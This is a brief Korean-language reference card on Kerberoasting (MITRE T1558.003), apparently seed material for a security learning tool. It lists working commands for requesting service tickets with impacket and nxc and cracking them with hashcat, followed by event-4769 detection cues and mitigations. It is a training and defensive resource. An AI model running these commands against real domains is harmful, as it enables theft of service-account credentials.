# 학습 시드(심화): kerberoasting

> 종합 레퍼런스(확립된 보안 지식 · 권위 출처 검증가능). 라이브 최신화: `assassin --learn kerberoasting`. P1: 머신별 라이트업 미참조.

## 개요
Kerberoasting(T1558.003): SPN 보유 서비스계정의 TGS 를 요청해 오프라인 크랙.

## 핵심 기법 · 열거
- 인증된 도메인 사용자면 누구나 TGS 요청 가능
- RC4 TGS → hashcat 13100
- 약한 서비스계정 암호가 핵심 취약

## 표준 도구 · 명령
```
impacket-GetUserSPNs <domain>/user:pass -dc-ip <dc> -request
nxc ldap <dc> -u user -p pass --kerberoasting out.txt
hashcat -m 13100 tgs.txt rockyou.txt
```

## 블루팀 탐지
4769 다수 SPN TGS 요청(단일 계정)·RC4 etype 선호·비정상 서비스티켓 폭증.

## 완화
서비스계정 25자+ 랜덤 암호·gMSA·AES 강제·SPN 최소화·4769 모니터링.

- 출처(검증): https://attack.mitre.org/techniques/T1558/003/
